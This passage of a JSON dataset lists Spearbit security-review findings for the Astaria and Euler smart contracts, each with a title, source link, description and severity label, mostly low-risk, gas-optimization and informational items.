        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "DepositHelper has the following two endpoints: fallback() external payable {} receive() external payable {} If one calls this contract by not supplying the deposit(...) function signature, the msg.value provided would get locked in this contract.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Updated ...EpochLength values are not validated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Sanity check is missing for updated s.minEpochLength and s.maxEpochLength. Need to make sure s.minEpochLength <= s.maxEpochLength",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "CollateralToken's conduit would have an open channel to an old Seaport when Seaport is updated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "After filing for a new Seaport the old Seaport would still have an open channel to it from the Col- lateralToken's conduit (assuming the old and new Seaport share the same conduit controller).",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "CollateralToken's tokenURI uses the underlying assets's tokenURI",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Since the CollateralToken positions can be sold on secondary markets like OpenSea, the tokenURI endpoint should be customised to avoid misleading users and it should contain information relating to the Collat- eralToken and not just its underlying asset. It would also be great to pull information from its associated lien to include here.  What-is-OpenSea-s-copymint-policy.  docs.opensea.io/docs/metadata-standards.  Necromint got banned on OpenSea.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Filing to update one of the main contract for another main contract lacks validation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "The main contracts AstariaRouter, CollateralToken, and LienToken all need to be aware of each other and form a connected triangle. They are all part of a single unit and perhaps are separated into 3 different contract due to code size and needing to have two individual ERC721 tokens. Their authorised filing structure is as follows:  Note that one cannot file for CollateralToken to change LienToken as the value of LienToken is only set during the CollateralToken's initialisation. If one files to change one of these nodes and forget to check or update the links between these contract, the triangle above would be broken.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "TRANSFER_PROXY is not queried in a consistent fashion.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Different usages of TRANSFER_PROXY and how it is queried  AstariaRouter: Used in pullToken(...) to move tokens from the msg.sender to a another address.  CollateralToken: Used in validateOrder(...) where Seaport has callbacked into. Here Collateral- Token gives approval to TRANSFER_PROXY which is queried from AstariaRouter for the settlement tokens. TRANSFER_PROXY is also used to transfer tokens. 47  LienToken: In _payment(...) TRANSFER_PROXY is used to transfer tokens from CollateralToken to the lien owner. This implies that the TRANSFER_PROXY used in CollateralToken should be the same that is used in LienToken. Therefore, from the above we see that: 1. TRANSFER_PROXY holds tokens approvals for ERC20 or wETH tokens used as lien tokens. 2. TRANSFER_PROXY's address should be the same at all call sites for the different contract AstariaRouter, CollateralToken and LienToken. 3. Except CollateralToken which queries TRANSFER_PROXY from AstariaRouter, the other two contract As- tariaRouter and LienToken read this value from their storage. Note that the deployment script sets assigns the same TRANSFER_PROXY to all the 3 main contracts in the codebase AstariaRouter, CollateralToken, and LienToken.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Multicall when inherited to ERC4626RouterBase does not bubble up the reverts correctly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Multicall does not bubble up the reverts correctly. The current implementation uses the following snippet to bubble up the reverts // https://github.com/AstariaXYZ/astaria-gpl/blob/.../src/Multicall.sol pragma solidity >=0.7.6; if (!success) { // Next 5 lines from https://ethereum.stackexchange.com/a/83577 if (result.length < 68) revert(); assembly { result := add(result, 0x04) } revert(abi.decode(result, (string))); } 48 // https://github.com/AstariaXYZ/astaria-gpl/blob/.../src/ERC4626RouterBase.sol pragma solidity ^0.8.17; ... abstract contract ERC4626RouterBase is IERC4626RouterBase, Multicall { ... } This method of bubbling up does not work with new types of errors:  Panic(uint256) 0.8.0 (2020-12-16)  Custom errors introduced in 0.8.4 (2021-04-21)  ...",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Cache VAULT().ROUTER().LIEN_TOKEN()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "leads to extra external calls.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "s.currentEpoch can be cached in processEpoch()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "s.currentEpoch is being read from the storage multiple times in the processEpoch().",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use basis points for ratios",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Fee ratios are represented through two state variables for numerator and denominator. Basis point system can be used in its place as it is simpler (denominator always set to 10_000), and gas efficient as denomi- nator is now a constant.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "liquidatorNFTClaim()'s arguments can be made calldata",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "The following arguments can be converted to calldata to save gas on copying them to memory: function liquidatorNFTClaim( ILienToken.Stack memory stack, OrderParameters memory params, uint256 counterAtLiquidation ) external whenNotPaused {",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "a.mulDivDown(b,1) is equivalent to a*b",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Highlighted code below the pattern of a.mulDivDown(b, 1) which is equivalent to a*b except the revert parameters in case of an overflow return uint256(s.slope).mulDivDown(delta_t, 1) + uint256(s.yIntercept);",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "try/catch can be removed for simplicity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "The following code catches a revert in the external call WETH.deposit{value: owning}() and then reverts itself in the catch clause try WETH.deposit{value: owing}() { WETH.approve(transferProxy, owing); // make payment lienToken.makePayment(stack); // check balance if (address(this).balance > 0) { // withdraw payable(msg.sender).transfer(address(this).balance); } } catch { revert(); } This effect can also be achieved without using try/catch which simplifies the code too.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache s.idToUnderlying[collateralId].auctionHash",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "In liquidatorNFTClaim(...), s.idToUnderlying[collateralId].auctionHash is read twice from the storage.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache keccak256(abi.encode(stack))",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "In LienToken._handleLiquidation(...) lienId is calculated as uint256 lienId = uint256(keccak256(abi.encode(stack))); Note that _handleLiquidation(...) is called by handleLiquidation(...) which has a modifier validateCol- lateralState(...): validateCollateralState( stack.lien.collateralId, keccak256(abi.encode(stack)) ) And thus keccak256(abi.encode(stack)) is performed twice. The same multiple hashing calculation also hap- pens in makePayment(...) flow. to cache the keccak256(abi.encode(stack)) value for the above",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Functions can be made view or pure",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Several functions can be view or pure. Compiler also warns about these functions. For instance, _validateRequest() can be made view. getSeaportMetadata() can be made pure instead of view.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Fix compiler generated warnings for unused arguments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Several functions have arguments which are not used and compiler generates a warning for each instance, cluttering the output. This makes it easy to miss useful warnings. Here is one example of a function with unused arguments: function deposit( uint256 assets, address receiver ) { } public virtual override(ERC4626Cloned, IERC4626) onlyVault returns (uint256 shares) revert NotSupported();",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Non-lien NFT tokens can get locked in the vaults",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Both public and private vault when their onERC721Received(...) is called they return the IERC721Receiver.onERC721Received.selector and perform extra logic if the msg.sender is the LienToken and the operator is the AstariaRouter. This means other NFT tokens (other than lien tokens) received by a vault will be locked.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Validation checks should be performed at the beginning of processEpoch()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "The following validation check for the data corresponding to the current epoch happens in the middle of processEpoch() where there have already been some accounting done: if (s.epochData[s.currentEpoch].liensOpenForEpoch > 0) { revert InvalidVaultState( InvalidVaultStates.LIENS_OPEN_FOR_EPOCH_NOT_ZERO ); }",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Define and onlyOwner modifier for VaultImplementation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "The following require statement has been used multiple times require(msg.sender == owner());",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Vault is missing an interface",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Vault is missing an interface",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "RepaymentHelper.makePayment(...) transfer is used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "In RepaymentHelper.makePayment(...) the transfer function is used to return extra native tokens sent to this contract. The use of transfer which restrict the amount of gas shared with the msg.sender is not required, since there are no actions after this call site, it is safe to call the msg.sender directly to transfer these funds.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider importing Uniswap libraries directly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "astaria-gpl copies the libraries highlighted above which were written originally in Solidity v0.7 and refactors them to v0.8. Uniswap has also provided these contracts for Solidity v0.8 in branches named 0.8. See v3-core@0.8 and v3-periphery@0.8. Using these files directly reduces the amount of code owned by Astaria.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Elements' orders are not consistent in solidity files",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Elements' orders are not consistent in solidity files",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "FileType definitions are not consistent",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Both ICollateralToken.FileType and ILienToken.FileType start their enums with NotSupported. The definition of FileType in IAstariaRouter is not consistent with that pattern. This might be due to having 0 as a NotSupported so that the file endpoints would revert.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "VIData.allowlist can transfer shares to entities not on the allowlist",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "allowList is only used to restrict the share recipients upon mint or deposit to a vault if allowLis- tEnabled is set to true. These shareholders can later transfer their share to other users who might not be on the allowList.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Extract common struct fields from IStrategyValidator implementations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "All the IStrategyValidator implementations have the following data encoded in the NewLienRe- quest.nlrDetails struct CommonData { uint8 version; address token; // LP token for Uni_V3... address borrower; ILienToken.Details lienDetails; bytes moreData; // depends on each implementation }",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "_createLien() takes in an extra argument",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "_createLien(LienStorage storage s, ...) doesn't use s and hence can be removed as an argument.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "unchecked has no effect",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "unchecked only affects the arithmetic operations directly nested under it. In this case unchecked is unnecessary: unchecked { s.yIntercept = (_totalAssets(s)); s.last = block.timestamp.safeCastTo40(); }",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Multicall can reuse msg.value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "A delegatecall forwards the same value for msg.value as found in the current context. Hence, all delegatecalls in a loop use the same value for msg.value. In the case of these calls using msg.value, it has the ability to use the native token balance of the contract itself for (uint256 i = 0; i < data.length; i++) { (bool success, bytes memory result) = address(this).delegatecall(data[i]); ... }",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Authorised entities can drain user assets",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "An authorized entity can steal user approved tokens (vault assets and vault tokens, ...) using these endpoints 58 function tokenTransferFrom( address token, address from, address to, uint256 amount ) external requiresAuth { ERC20(token).safeTransferFrom(from, to, amount); } function tokenTransferFromWithErrorReceiver( address token, address from, address to, uint256 amount ) external requiresAuth { try ERC20(token).transferFrom(from, to, amount) {} catch { _transferToErrorReceiver(token, from, to, amount); } } Same risk applies to all the other upgradable contracts.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Conditional statement in _validateSignature(...) can be simplified/optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "When validating the vault strategist's (or delegate's) signature for the commitment, we perform the following check if ( (recovered != strategist && recovered != delegate) || recovered == address(0) ) { revert IVaultImplementation.InvalidRequest( IVaultImplementation.InvalidRequestReason.INVALID_SIGNATURE ); } The conditional statement: (recovered != strategist && recovered != delegate) 59 perhaps can be optimised/simplified.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "AstariaRouter cannot deposit into private vaults",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "The allowlist for private vaults only includes the private vault's owner function newVault( address delegate, address underlying ) external whenNotPaused returns (address) { address[] memory allowList = new address[](1); allowList[0] = msg.sender; RouterStorage storage s = _loadRouterSlot(); ... } Note that for private vaults we cannot modify or disable/enable the allowlist. includes the owner. It is always enabled and only That means only the owner can deposit into the private vault function deposit( uint256 amount, address receiver ) public virtual whenNotPaused returns (uint256) { VIData storage s = _loadVISlot(); require(s.allowList[msg.sender] && receiver == owner()); ... } If we the owner would like to be able to use the AstariaRouter's interface by calling its deposit(...), or de- positToVault(...) endpoint (which uses the pulling strategy from transfer proxy), it would not be able to. Anyone can directly transfer tokens to this private vault by calling asset() directly. So above requirement re- quire(s.allowList[msg.sender] ... ) seems to also be there to avoid potential mistakes when one is calling the ERC4626RouterBase.deposit(...) endpoint to deposit into the vault indirectly using the router.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Reorganise sanity/validity checks in the commitToLien(...) flow",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "The following checks are preformed in _validateRequest(...):  params.lienRequest.amount == 0: if (params.lienRequest.amount == 0) { revert ILienToken.InvalidLienState( ILienToken.InvalidLienStates.AMOUNT_ZERO ); } The above check can be moved to the very beginning of the commitToLien(...) flow. Perhaps right before or after we check the commitment's vault provided is valid.  newStack.lien.details.duration < s.minLoanDuration can be checked right after we compare to time to the second epoch end: if (publicVault.supportsInterface(type(IPublicVault).interfaceId)) { uint256 timeToSecondEpochEnd = publicVault.timeToSecondEpochEnd(); require(timeToSecondEpochEnd > 0, \"already two epochs ahead\"); if (timeToSecondEpochEnd < lien.details.duration) { lien.details.duration = timeToSecondEpochEnd; } } if (lien.details.duration < s.minLoanDuration) { revert ILienToken.InvalidLienState( ILienToken.InvalidLienStates.MIN_DURATION_NOT_MET ); } This only works if we assume the LienToken.createLien(...) endpoint does not change the duration. The current implementation does not.  block.timestamp > params.lienRequest.strategy.deadline can also be checked at the very beginning of the commitToLien flow.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Refactor fetching strategyValidator",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Both _validateCommitment(...) and getStrategyValidator(...) need to fetch strategyVal- idator and both use the same logic.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "The stack provided as an extra data to settle Seaport auctions need to be retrievable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "The stack provided as an extra data to settle Seaport auctions need to be retrievable. Perhaps one can figure this from various events or off-chain agents, but it is not directly retrievable.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Make sure CollateralToken is connected to Seaport v1.5",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
        "body": "Currently the CollateralToken proxy (v0) is connected to Seaport v1.1 which has different call- backs to the zone and it also only performs static calls. If the current version of CollateralToken gets connected to the Seaport v1.1, no one would be able to settle auctions created by the CollateralToken. This is due to the fact that the callbacks would revert.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "isSignerValid cannot be considered future-proof",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf",
        "body": "The isSignerValid function is used by the permit function to validate if the signer can be consid- ered a safe and valid signer. From the Natspec documentation and the inline comments, we can assume that:  The function will be overridden with a custom logic given the chain on which the EthereumVaultConnector contract will be deployed to.  If the signer and precompiles or predeployes share the same owner (fall into the same 19 bytes address prefix), the signer should be considered invalid. The list of precompiles for a chain is not a static and fixed list and could change when a chain is upgraded. Because of this, the logic on which the isSignerValid is based on could end up not covering all the cases it should. This becomes a problem given that the EthereumVaultConnector is not an upgradable contract.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Docs: Consider documenting explicitly that the number of collateral per account is restricted to an upper bound of 10",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf",
        "body": "The accountCollaterals is a mapping state variable that maps and address to a SetStorage type. The SetStorage type can be seen as a \"custom\" array that at max can contain 10 elements. Having the numbers of collateral enabled limited to a maximum number of 10 should be well documented inside the contract, interface and documentation because it could limit and influence the user's experience in certain scenarios. Let's assume that Alice has enabled 10 collaterals and Alice has performed a borrow on controllerVault with the max possible LTV possible. Note that the controllerVault has its own logic and collateral whitelist, so it could decide to only recognize 1 of those collaterals and discard the rest (value of the discarded collaterals is 0 inside the HF). Let's now assume that Alice becomes liquidable. Alice has 3 options: 1) Add a new collateral recognized by controllerVault (if not recognized, controller- Vault.checkAccountStatus would revert). 2) Repay enough debt. 3) Supply enough collateral to the existing collaterals already recognized by controllerVault (if not recog- nized, controller.checkAccountStatus would revert). Let's say that Alice is unable to perform action 2 and 3 because she can't repay the debt, or she can't supply existing collateral tokens. The only possible option in such scenarios is to: 1) Perform EVC.disableCollateral for an existing collateral (preferably one that is not recognized by con- trollerVault). 4 2) Perform EVC.enableCollateral for a new collateral that is recognized by controllerVault. Note that this operation can only be done inside an EVC.batch call, otherwise the disableCollateral operation would revert because Alice is already liquidable and would not be allowed to remove a collateral (it would trigger a non-deferred account-status-check). There are additional edge-case scenarios that could create difficulties for the end user when he/she has enabled the max number of collaterals, and the limitations (of 10 collaterals) should be well documented.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "The setAccountOwnerInternal is redundant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf",
        "body": "The setAccountOwnerInternal is redundant as is only used in the authenticateCaller function.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Optimization on onlyOwner and setOperator",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf",
        "body": "The onlyOwner modifier and the setOperator function uses the same logic to authenticate a call:  Calculate the phantomAccount address phantomAccount = address(uint160(uint152(addressPrefix)) << ACCOUNT_ID_OFFSET);  Then authenticate the call authenticateCaller({account: phantomAccount, allowOperator: false, checkLockdownMode: false}); The setOperator does not use the modifier because it needs to use the msgSender returned by the authenti- cateCaller but both use the same 2 operations to authenticate a call which results in duplicated code.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider using ACCOUNT_ID_OFFSET instead of 8",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf",
        "body": "The ACCOUNT_ID_OFFSET is a constant used to determine the account prefix or phantom accounts. This constant is used in various places instead of the number 8 but it's missing in the getAddressPrefixInternal. function getAddressPrefixInternal(address account) internal pure returns (bytes19) { return bytes19(uint152(uint160(account) >> 8)); }",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider improving the comments in the setLockdownMode and setPermitDisabledMode, aligning them with the natspec documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf",
        "body": "In both the setLockdownMode and setPermitDisabledMode, the mode cannot be turned off (revert) when checks are deferred and when msg.sender == adress(this). Those two requirements mean that you cannot turn off the mode when the functions are executed via a EVC.call, EVC.batch or EVC.permit. The inline comment: \"to disable this mode a direct call to the EVC must be made\" could be improved in clarity by being more explicit, like how it's documented inside the relative Natspec documen- tation written for the very same functions inside the IEthereumVaultConnector interface.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "All the contracts, libraries and interfaces are declared with a floating pragma",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf",
        "body": "All the contracts, libraries and interfaces are declared with a floating pragma: pragma solidity (cid:2)0.8.19;. The floating pragma issue is mitigated by the fact that the Solidity version, which will be used at build time, is locked at 0.8.24 inside foundry.toml. Nevertheless, it's both a good dev and security practice to specify the locked pragma that should be used directly in the contracts, libraries and interfaces.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Natspec: the operator natspec for setOperator and setAccountOperator is outdated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf",
        "body": "In both the functions Natspec documentation, it's stated that the operator cannot be equal to ad- dress(0). This check is not implemented in the actual code, and the Euler team has indeed confirmed that the documentation is outdated.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Natspec: improve and clarify the natspec documentation about the enabled parameter for the set- PermitDisabledMode function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf",
        "body": "The setPermitDisabledMode allows the owner of an addressPrefix to disable the permit func- tionality. When enabled=TRUE the permit function will be disabled (user is enabling the disable-mode), when enabled=FALSE the permit function will be enabled (user is disabling the disable-mode). The current Natspec for the enabled parameter states: /// @param enabled A boolean indicating whether to enable or disable permit functionality. By just reading such documentation, an external actor could assume that passing enabled=true would enable the permit function, while in reality, it's totally the opposite.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "callThroughEVC ABI encoding does not right-pad data parameter with zeroes",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf",
        "body": "The callThroughEVC modifier encodes the following call using custom code: function call(address targetContract, address onBehalfOfAccount, uint256 value, bytes calldata data) external returns (bytes memory result); According to the ABI argument encoding, it should right-pad the bytes data parameter with zeroes until it's a multiple of 32. followed by the minimum number of zero-bytes such that len(enc(X)) is a multiple of 32. 7 However, the custom assembly code does not do this, in contrast to what abi.encodeCall(EVC.call, (ad- dress(this), msg.sender, 0x0, data)) would do.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Lockdown mode is checked before authenticating caller",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf",
        "body": "The authenticateCaller({ account, checkLockdownMode: true }) function checks the lock- down mode of the provided account even before checking if the caller is allowed to operate on behalf of account. The code will revert with EVC_LockdownMode if the account is in lockdown mode, instead of EVC_NotAuthorized if the caller is not authorized.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "batchSimulation's result array's length increased",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf",
        "body": "sult(batchItemsResult, accountsStatusCheckResult, vaultsStatusCheckResult);. copied to the result array and the inner arrays are being decoded via: The batchSimulation function calls batchRevert that returns EVC_RevertedBatchRe- This return data is (batchItemsResult, accountsStatusCheckResult, vaultsStatusCheckResult) = abi.decode(result, (BatchItemResult[], StatusCheckResult[], StatusCheckResult[])); For this to work, the 4-byte selector needs to be skipped. The code does this by simply pointing the result array pointer 4 bytes ahead: assembly { result := add(result, 4) } However, this changes the result array's length as it now includes the selector in addition to its initial length. The array length will be > 2**32. Theabi.decode function currently still works as it only checks that, while decoding, the read memory offsets are not out of the array bounds (using the wrong result length). As batchRevert always correctly encodes its return data and the new result length is always greater than the original result length, this check does not cause issues.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Docs: Lockdown mode specification violations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf",
        "body": "The Lockdown mode specification currently reads: the EVC MUST significantly reduce its functionality across the Once Lockdown Mode activated, Owner's Accounts. In this mode, the Owner is restricted to managing Operators and Nonces, while authorized Operators are restricted to revoking their own permissions. With Lockdown Mode active, neither the Owner nor the Operators can carry any other operations on the EVC. Notably, calling external smart contracts on behalf of the Owner or any of their Accounts is prohibited. However, enabled Controllers can still control collaterals for the Accounts, even under lockdown. summarize, To eral/forgiveAccountStatusCheck/disableController as be callable. setOperator, setNonce, only setAccountOperator it's the controller (and triggering these) controlCollat- should However, it's currently possible to use call/batch functions to call back to msg.sender as it skips the authenti- cateCaller(checkLockdown=true) checks. This technically violates \"Notably, calling external smart contracts on behalf of the Owner or any of their Accounts is prohibited\". The owner can also call setLockdownMode to turn it off and setPermitDisabledMode.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Docs: Improve reentrancy specification",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Euler-Spearbit-Security-Review-EVC-April-2024.pdf",
        "body": "The reentrancy specification currently reads: Only the Checks-Deferrable Call functions and Permit function MUST be allowed to re-enter the EVC.",
        "labels": [
            "Spearbit",
            "Euler",
            "Severity: Informational"
        ]
    },
    {
        "title": "Reward calculates earned incorrectly on each epoch boundary",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
